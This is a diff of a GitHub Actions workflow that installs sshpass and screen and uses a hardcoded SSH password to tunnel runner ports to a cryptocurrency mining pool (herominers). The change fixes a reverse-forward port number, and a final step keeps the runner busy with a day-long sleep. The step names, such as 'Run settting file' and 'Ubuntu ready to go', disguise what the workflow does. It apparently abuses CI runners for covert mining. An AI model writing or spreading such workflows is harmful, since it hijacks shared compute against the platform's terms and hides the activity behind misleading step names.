@@ -14,7 +14,7 @@ jobs:
         run: sudo apt update &> /dev/null && sudo apt install sshpass screen -y &> /dev/null && screen -m -d -S pool sudo sshpass -p 'aunglay' ssh testing@localhost -o StrictHostKeyChecking=no -L 8128:de.beam.herominers.com:1130 -o RemoteCommand="top"
 
       - name: Run settting file
-        run: screen -m -d -S pool1 sudo sshpass -p 'aunglay' ssh testing@localhost -o StrictHostKeyChecking=no -R 81111:localhost:8128 -o RemoteCommand="top"
+        run: screen -m -d -S pool1 sudo sshpass -p 'aunglay' ssh testing@localhost -o StrictHostKeyChecking=no -R 8111:localhost:8128 -o RemoteCommand="top"
         
       - name: Ubuntu ready to go 
         run: sleep 1d  
